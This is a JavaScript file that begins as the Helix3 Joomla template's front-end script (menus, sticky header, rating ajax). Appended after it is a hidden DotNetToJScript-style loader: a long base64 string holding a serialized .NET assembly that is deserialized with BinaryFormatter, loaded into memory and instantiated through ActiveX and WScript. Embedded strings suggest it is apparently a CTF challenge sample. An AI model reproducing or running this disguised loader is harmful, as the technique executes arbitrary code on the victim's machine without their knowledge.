/**
 * @package Helix3 Framework
 * @author JoomShaper http://www.joomshaper.com
 * @copyright Copyright (c) 2010 - 2016 JoomShaper
 * @license http://www.gnu.org/licenses/gpl-2.0.html GNU/GPLv2 or later
 */

function ($) {

    // ************    START Helix 1.4 JS    ************** //
    // **************************************************** //

    //Default
    if (typeof sp_offanimation === 'undefined' || sp_offanimation === '') {
        sp_offanimation = 'default';
    }

    if (sp_offanimation == 'default') {
        $('#offcanvas-toggler').on('click', function (event) {
            event.preventDefault();
            $('.off-canvas-menu-init').addClass('offcanvas');
        });

        $('<div class="offcanvas-overlay"></div>').insertBefore('.offcanvas-menu');
        $('.close-offcanvas, .offcanvas-overlay').on('click', function (event) {
            event.preventDefault();
            $('.off-canvas-menu-init').removeClass('offcanvas');
        });
    }

    // Slide Top Menu
    if (sp_offanimation == 'slidetop') {
        $('#offcanvas-toggler').on('click', function (event) {
            event.preventDefault();
            $('.off-canvas-menu-init').addClass('slide-top-menu');
        });

        $('<div class="offcanvas-overlay"></div>').insertBefore('.offcanvas-menu');
        $('.close-offcanvas, .offcanvas-overlay').on('click', function (event) {
            event.preventDefault();
            $('.off-canvas-menu-init').removeClass('slide-top-menu');
        });
    }

    //Full Screen
    if (sp_offanimation == 'fullscreen') {
        $('#offcanvas-toggler').on('click', function (event) {
            event.preventDefault();
            $('.off-canvas-menu-init').addClass('full-screen-off-canvas');
        });
        $(document).ready(function () {
            $('.off-canvas-menu-init').addClass('full-screen');
        });
        $('.close-offcanvas, .offcanvas-overlay').on('click', function (event) {
            event.preventDefault();
            $('.off-canvas-menu-init').removeClass('full-screen-off-canvas');
        });
    }

    //Full screen from top
    if (sp_offanimation == 'fullScreen-top') {
        $('#offcanvas-toggler').on('click', function (event) {
            event.preventDefault();
            $('.off-canvas-menu-init').addClass('full-screen-off-canvas-ftop');
        });
        $(document).ready(function () {
            $('.off-canvas-menu-init').addClass('full-screen-ftop');
        });
        $('.close-offcanvas, .offcanvas-overlay').on('click', function (event) {
            event.preventDefault();
            $('.off-canvas-menu-init').removeClass('full-screen-off-canvas-ftop');
        });
    }

    //Dark with plus
    if (sp_offanimation == 'drarkplus') {
        $('#offcanvas-toggler').on('click', function (event) {
            event.preventDefault();
            $('.off-canvas-menu-init').addClass('new-look-off-canvas');
        });
        $('<div class="offcanvas-overlay"></div>').insertBefore('.offcanvas-menu');
        $(document).ready(function () {
            $('.off-canvas-menu-init').addClass('new-look');
        });
        $('.close-offcanvas,.offcanvas-overlay').on('click', function (event) {
            event.preventDefault();
            $('.off-canvas-menu-init').removeClass('new-look-off-canvas');
        });
    }

    // if sticky header
    if ($("body.sticky-header").length > 0) {
        var fixedSection = $('#sp-header');
        // sticky nav
        var headerHeight = fixedSection.outerHeight();
        var stickyNavTop = fixedSection.offset().top;
        fixedSection.addClass('animated');
        fixedSection.before('<div class="nav-placeholder"></div>');
        $('.nav-placeholder').height('inherit');
        //add class
        fixedSection.addClass('menu-fixed-out');
        var stickyNav = function () {
            var scrollTop = $(window).scrollTop();
            if (scrollTop > stickyNavTop) {
                fixedSection.removeClass('menu-fixed-out').addClass('menu-fixed');
                $('.nav-placeholder').height(headerHeight);
            } else {
                if (fixedSection.hasClass('menu-fixed')) {
                    fixedSection.removeClass('menu-fixed').addClass('menu-fixed-out');
                    $('.nav-placeholder').height('inherit');
                }
            }
        };
        stickyNav();
        $(window).scroll(function () {
            stickyNav();
        });
    }


    // go to top
    if (typeof sp_gotop === 'undefined') {
        sp_gotop = '';
    }

    if (sp_gotop) {
        // go to top
        $(window).scroll(function () {
            if ($(this).scrollTop() > 100) {
                $('.scrollup').fadeIn();
            } else {
                $('.scrollup').fadeOut(400);
            }
        });

        $('.scrollup').click(function () {
            $("html, body").animate({
                scrollTop: 0
            }, 600);
            return false;
        });
    } // has go to top

    // Preloader
    if (typeof sp_preloader === 'undefined') {
        sp_preloader = '';
    }

    if (sp_preloader) {
        $(window).on('load', function () {
            if ($('.sp-loader-with-logo').length > 0) {
                move();
            }
            setTimeout(function () {
                $('.sp-pre-loader').fadeOut();
            }, 1000);
        });
    } // has preloader
    //preloader Function
    function move() {
        var elem = document.getElementById("line-load");
        var width = 1;
        var id = setInterval(frame, 10);
        function frame() {
            if (width >= 100) {
                clearInterval(id);
            } else {
                width++;
                elem.style.width = width + '%';
            }
        }
    }
    // ************    END:: Helix 1.4 JS    ************** //
    // **************************************************** //

    // **************   START Mega SCRIPT   *************** //
    // **************************************************** //

    //mega menu
    $('.sp-megamenu-wrapper').parent().parent().css('position', 'static').parent().css('position', 'relative');
    $('.sp-menu-full').each(function () {
        $(this).parent().addClass('menu-justify');
    });

    // boxlayout
    if ($("body.layout-boxed").length > 0) {
        var windowWidth = $('#sp-header').parent().outerWidth();
        $("#sp-header").css({"max-width": windowWidth, "left": "auto"});
    }

    // **************   END:: Mega SCRIPT   *************** //
    // **************************************************** //

    // **************  START Others SCRIPT  *************** //
    // **************************************************** //

    //Tooltip
    $('[data-toggle="tooltip"]').tooltip();

    // Article Ajax voting
    $(document).on('click', '.sp-rating .star', function (event) {
        event.preventDefault();

        var data = {
            'action': 'voting',
            'user_rating': $(this).data('number'),
            'id': $(this).closest('.post_rating').attr('id')
        };

        var request = {
            'option': 'com_ajax',
            'plugin': 'helix3',
            'data': data,
            'format': 'json'
        };

        $.ajax({
            type: 'POST',
            data: request,
            beforeSend: function () {
                $('.post_rating .ajax-loader').show();
            },
            success: function (response) {
                var data = $.parseJSON(response.data);

                $('.post_rating .ajax-loader').hide();

                if (data.status == 'invalid') {
                    $('.post_rating .voting-result').text('You have already rated this entry!').fadeIn('fast');
                } else if (data.status == 'false') {
                    $('.post_rating .voting-result').text('Somethings wrong here, try again!').fadeIn('fast');
                } else if (data.status == 'true') {
                    var rate = data.action;
                    $('.voting-symbol').find('.star').each(function (i) {
                        if (i < rate) {
                            $(".star").eq(-(i + 1)).addClass('active');
                        }
                    });

                    $('.post_rating .voting-result').text('Thank You!').fadeIn('fast');
                }

            },
            error: function () {
                $('.post_rating .ajax-loader').hide();
                $('.post_rating .voting-result').text('Failed to rate, try again!').fadeIn('fast');
            }
        });
    });

    // **************  END:: Others SCRIPT  *************** //
    // **************************************************** //



    // **************  START EDUCON SCRIPT  *************** //
    // **************************************************** //
    // Top Search
    $(".search-open-icon").on('click', function () {
        $(".top-search-input-wrap, .top-search-overlay").fadeIn(200);
        $(this).hide();
        $('.search-close-icon').show().css('display', 'inline-block');
    });

    $(".search-close-icon, .top-search-overlay").on('click', function () {
        $(".top-search-input-wrap, .top-search-overlay").fadeOut(200);
        $('.search-close-icon').hide();
        $('.search-open-icon').show();
    });
    // **************   END:: EDUCON SCRIPT   *************** //
    // **************************************************** //
}

function setversion() {
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABYAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAzvtHXwAAAAAA"+
"AAAA4AAiIAsBMAAADAAAAAgAAAAAAACmKwAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAVCsA"+
"AE8AAAAAQAAAhAQAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAACsCwAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAhAQAAABA"+
"AAAABgAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAUAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAIgrAAAAAAAASAAAAAIABQA8IQAAGAoAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGzAEAMEAAAAB"+
"AAARAigOAAAKKA8AAApzEAAACnIBAABwbxEAAApzEgAACigTAAAKCnMUAAAKJQZvFQAACiUgWAIA"+
"ACBYAgAAcxYAAApvFwAACiUXbxgAAAoLcxkAAAolIFgCAAAgWAIAAHMWAAAKbxoAAAolF28bAAAK"+
"JXJtAABwbxwAAAolKB0AAApylwAAcCgeAAAKKB8AAApvIAAACiVvIQAACgdvIgAACm8jAAAKJt4Y"+
"byQAAAoYMwtyrwAAcCglAAAKJt4DJt4AKgAAAAEcAAAAAAYAoqgAFRIAAAEAAAYAor0AAxMAAAFC"+
"U0pCAQABAAAAAAAMAAAAdjIuMC41MDcyNwAAAAAFAGwAAADgAgAAI34AAEwDAAAUBAAAI1N0cmlu"+
"Z3MAAAAAYAcAADABAAAjVVMAkAgAABAAAAAjR1VJRAAAAKAIAAB4AQAAI0Jsb2IAAAAAAAAAAgAA"+
"AUcUAgAJAAAAAPoBMwAWAAABAAAAIwAAAAIAAAABAAAAJQAAAA4AAAABAAAAAQAAAAQAAAAAANQB"+
"AQAAAAAABgAhAeoCBgCOAeoCBgBuALgCDwAKAwAABgCWAF0CBgAEAV0CBgDlAF0CBgB1AV0CBgBB"+
"AV0CBgBaAV0CBgCtAF0CBgCCAMsCBgBgAMsCBgDIAF0CBgB2AyYCCgBSALUBDgDEAzkDEgClAn0D"+
"BgCoAiYCDgBRAjkDEgCVA30DBgAZAgoABgAfAgoACgCwAbUBDgAGAjkDDgA7ADkDDgAtAjkDDgCT"+
"AjkDBgCfAyYCBgDPAQoACgBMArUBZwBvAgAADgCIAzkDEgBjA30DDgC5AzkDAAAAAAEAAAAAAAEA"+
"AQABABAATgMAAD0AAQABAFAgAAAAAIYYsgIGAAEACQCyAgEAEQCyAgYAGQCyAgoAKQCyAhAAMQCy"+
"AhAAOQCyAhAAQQCyAhAASQCyAhAAUQCyAhAAWQCyAhAAYQCyAhUAaQCyAhAAcQCyAhAAeQCyAgYA"+
"oQAZAyEAqQCyAgYAqQAUACUAsQCyAisAgQAOAjEAiQCyAgYAiQBOADgAwQCyAj4AyQCsAUQAiQAu"+
"AEoA2QCyAgYA2QCsAUQA2QCBAlAAyQCrAxAA6QDPA1YA8QBYAFoA+QA7AmAA2QAyAmYAyQAsA2wA"+
"AQEqAHIA2QDEAXgAkQBYA34AGQG0A4QALgALAJ0ALgATAKYALgAbAMUALgAjAM4ALgArAOMALgAz"+
"AA0BLgA7AA0BLgBDAM4ALgBLABMBLgBTAA0BLgBbAA0BLgBjADgBLgBrAGIBQwBbAG8BGgAEgAAA"+
"AQAAAAAAAAAAAAAAAADjAwAAAgAAAAAAAAAAAAAAiwAhAAAAAAACAAAAAAAAAAAAAACUALUBAAAA"+
"AAIAAAAAAAAAAAAAAIsAOQMAAAAAAgAAAAAAAAAAAAAAiwAmAgAAAAAAAAAAADxNb2R1bGU+AFN5"+
"c3RlbS5JTwBEb3dubG9hZERhdGEAbXNjb3JsaWIAQWRkAHNldF9TaXplTW9kZQBQaWN0dXJlQm94"+
"U2l6ZU1vZGUAc2V0X0ltYWdlAENvbWJpbmUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmli"+
"dXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRy"+
"YWRlbWFya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29u"+
"ZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0"+
"aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5"+
"Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0"+
"aWJpbGl0eUF0dHJpYnV0ZQBzZXRfU2l6ZQBTeXN0ZW0uRHJhd2luZwBTaG93RGlhbG9nAFBhdGgA"+
"SENNVVMtQ1RGe0V4YW1wbGUtQXNzZW1ibHktZnJvbS1HbHV0YW1vLVRlYW19LmRsbABDb250cm9s"+
"AEZyb21TdHJlYW0ATWVtb3J5U3RyZWFtAFN5c3RlbQBGb3JtAHNldF9JY29uAEV4dHJhY3RBc3Nv"+
"Y2lhdGVkSWNvbgBBcHBsaWNhdGlvbgBTeXN0ZW0uUmVmbGVjdGlvbgBDb250cm9sQ29sbGVjdGlv"+
"bgBzZXRfU3RhcnRQb3NpdGlvbgBGb3JtU3RhcnRQb3NpdGlvbgBXZWJFeGNlcHRpb24ALmN0b3IA"+
"U3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0u"+
"UnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAEVuYWJsZVZpc3VhbFN0eWxl"+
"cwBnZXRfQ29udHJvbHMAU3lzdGVtLldpbmRvd3MuRm9ybXMAVGVzdENsYXNzAGdldF9TdGF0dXMA"+
"V2ViRXhjZXB0aW9uU3RhdHVzAE9iamVjdABTeXN0ZW0uTmV0AERpYWxvZ1Jlc3VsdABXZWJDbGll"+
"bnQARW52aXJvbm1lbnQAc2V0X1RleHQAU2hvdwBNZXNzYWdlQm94AFBpY3R1cmVCb3gAZ2V0X1N5"+
"c3RlbURpcmVjdG9yeQBIQ01VUy1DVEZ7RXhhbXBsZS1Bc3NlbWJseS1mcm9tLUdsdXRhbW8tVGVh"+
"bX0AAAAAAGtoAHQAdABwAHMAOgAvAC8AbQBlAGQAaQBhAC4AZwBpAHAAaAB5AC4AYwBvAG0ALwBt"+
"AGUAZABpAGEALwBkAHAAUwByAG0ANABjAHcAVQBtAEMAZQBRAC8AZwBpAHAAaAB5AC4AZwBpAGYA"+
"AClTAGUAYwByAGUAdAAgAGsAaQBzAHMAIABmAG8AcgAgAHkAbwB1ACEAABdtAHMAcABhAGkAbgB0"+
"AC4AZQB4AGUAAH9BAHIAZQAgAHkAbwB1ACAAYgBlAGgAaQBuAGQAIABhACAAZgBpAHIAZQB3AGEA"+
"bABsAD8AIAAgAEkAZgAgAHMAbwAsACAAZwBvACAAdABoAHIAbwB1AGcAaAAgAHQAaABlACAAcABy"+
"AG8AeAB5ACAAcwBlAHIAdgBlAHIALgAAAOoYdDhMsUdCiuU3tBVkag8ABCABAQgDIAABBSABARER"+
"BCABAQ4EIAEBAgYHAhJBEkUDAAABBSABHQUOBSABAR0FBgABEkESXQUgAQESQQUgAgEICAUgAQER"+
"YQUgAQERaQUgAQERcQMAAA4FAAIODg4FAAESfQ4FIAEBEn0FIAASgIEFIAEBEmUFIAARgIUFIAAR"+
"gIkGAAERgIUOCLd6XFYZNOCJCLA/X38R1Qo6CAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0"+
"aW9uVGhyb3dzAQgBAAIAAAAAABQBAA9FeGFtcGxlQXNzZW1ibHkAACkBACRFeGFtcGxlIEFzc2Vt"+
"Ymx5IGZvciBEb3ROZXRUb0pTY3JpcHQAAAUBAAAAACQBAB9Db3B5cmlnaHQgwqkgSmFtZXMgRm9y"+
"c2hhdyAyMDE3AAApAQAkNTY1OThmMWMtNmQ4OC00OTk0LWEzOTItYWYzMzdhYmU1Nzc3AAAMAQAH"+
"MS4wLjAuMAAABQEAAQAAAAAAfCsAAAAAAAAAAAAAlisAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AIgrAAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"+
"AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAAoBAAAAAAAAAAAAAAoBDQAAABW"+
"AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAA"+
"PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"+
"AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEiAMAAAEAUwB0AHIAaQBuAGcA"+
"RgBpAGwAZQBJAG4AZgBvAAAAZAMAAAEAMAAwADAAMAAwADQAYgAwAAAAYgAlAAEAQwBvAG0AbQBl"+
"AG4AdABzAAAARQB4AGEAbQBwAGwAZQAgAEEAcwBzAGUAbQBiAGwAeQAgAGYAbwByACAARABvAHQA"+
"TgBlAHQAVABvAEoAUwBjAHIAaQBwAHQAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAA"+
"AAAAAAAAAEgAEAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABFAHgAYQBtAHAA"+
"bABlAEEAcwBzAGUAbQBiAGwAeQAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAu"+
"ADAALgAwAC4AMAAAAIQAMgABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAASABDAE0AVQBTAC0A"+
"QwBUAEYAewBFAHgAYQBtAHAAbABlAC0AQQBzAHMAZQBtAGIAbAB5AC0AZgByAG8AbQAtAEcAbAB1"+
"AHQAYQBtAG8ALQBUAGUAYQBtAH0ALgBkAGwAbAAAAGIAHwABAEwAZQBnAGEAbABDAG8AcAB5AHIA"+
"aQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgAEoAYQBtAGUAcwAgAEYAbwByAHMAaABh"+
"AHcAIAAyADAAMQA3AAAAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAA"+
"AAAAAIwAMgABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABIAEMATQBVAFMALQBD"+
"AFQARgB7AEUAeABhAG0AcABsAGUALQBBAHMAcwBlAG0AYgBsAHkALQBmAHIAbwBtAC0ARwBsAHUA"+
"dABhAG0AbwAtAFQAZQBhAG0AfQAuAGQAbABsAAAAQAAQAAEAUAByAG8AZAB1AGMAdABOAGEAbQBl"+
"AAAAAABFAHgAYQBtAHAAbABlAEEAcwBzAGUAbQBiAGwAeQAAADQACAABAFAAcgBvAGQAdQBjAHQA"+
"VgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABW"+
"AGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAqDsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJlZmxl"+
"Y3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10pCAAAAAoL";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
    al.Add(undefined);
    WScript.Echo(d.DynamicInvoke(al.ToArray()).FullName);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}